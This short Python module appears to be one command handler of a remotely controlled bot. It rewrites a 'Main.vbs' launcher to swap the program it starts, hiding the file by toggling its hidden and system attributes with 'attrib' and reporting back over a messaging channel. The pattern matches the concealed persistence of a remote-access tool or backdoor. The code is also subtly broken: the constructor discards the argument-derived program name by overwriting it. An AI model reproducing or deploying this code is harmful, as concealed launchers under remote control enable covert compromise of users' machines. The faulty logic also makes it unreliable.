import os
import re
class Change_Prog():
	def __init__(self, _):
		self.program = " ".join(_.args[0])
		self.Send_Message = _.Send_Message
		self.program = _.program
		self.Main()

	def Main(self):
		dirname = "\\".join(os.path.abspath(__file__).split("\\")[:-1]) + "\\"
		filename =  dirname + "Main.vbs"
		file = open(filename,"r")
		read = file.read()
		file.close()
		read = read.replace(re.findall('" ""(.*?)""',read)[0],self.program)
		os.system('attrib -h -s ' + filename)
		file = open(filename,"w")
		file.write(read)
		file.close()
		os.system('attrib +h +s ' + filename)
		self.Send_Message.Send("%E2%9C%94%EF%B8%8F Program Name Changed")
